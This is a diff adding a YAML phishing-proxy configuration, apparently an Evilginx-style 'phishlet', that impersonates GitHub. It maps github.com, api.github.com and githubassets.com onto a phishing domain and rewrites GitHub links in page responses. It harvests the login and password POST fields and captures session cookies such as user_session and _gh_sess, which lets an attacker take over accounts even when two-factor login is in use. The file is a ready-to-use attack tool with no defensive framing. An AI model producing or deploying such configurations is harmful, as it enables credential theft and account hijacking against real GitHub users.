@@ -1,0 +1,65 @@
+name: "GitHub"
+author: "PhantomGate"
+min_ver: "1.0.0"
+
+proxy_hosts:
+  - phish_sub: "github"
+    orig_sub: "github.com"
+    domain: "github.com"
+    session: true
+    is_ssl: true
+  - phish_sub: "api"
+    orig_sub: "api.github.com"
+    domain: "github.com"
+    session: false
+    is_ssl: true
+  - phish_sub: "assets"
+    orig_sub: "github.githubassets.com"
+    domain: "githubassets.com"
+    session: false
+    is_ssl: true
+
+sub_filters:
+  - triggers_on: "github.com"
+    orig_sub: "github"
+    domain: "github.com"
+    search: "github.com"
+    replace: "github.{phish_domain}"
+    mimes: ["text/html", "application/javascript", "application/json"]
+  - triggers_on: "github.com"
+    orig_sub: "github"
+    domain: "github.com"
+    search: "github.githubassets.com"
+    replace: "assets.{phish_domain}"
+    mimes: ["text/html", "application/javascript"]
+  - triggers_on: "github.com"
+    orig_sub: "github"
+    domain: "github.com"
+    search: "api.github.com"
+    replace: "api.{phish_domain}"
+    mimes: ["text/html", "application/javascript", "application/json"]
+
+credentials:
+  username:
+    key: "login"
+    search: ""
+    type: "post"
+  password:
+    key: "password"
+    search: ""
+    type: "post"
+
+auth_tokens:
+  - domain: ".github.com"
+    keys:
+      - "user_session"
+      - "__Host-user_session_same_site"
+      - "dotcom_user"
+      - "logged_in"
+  - domain: "github.com"
+    keys:
+      - "_gh_sess"
+
+landing_path:
+  - "/login"
+  - "/session"
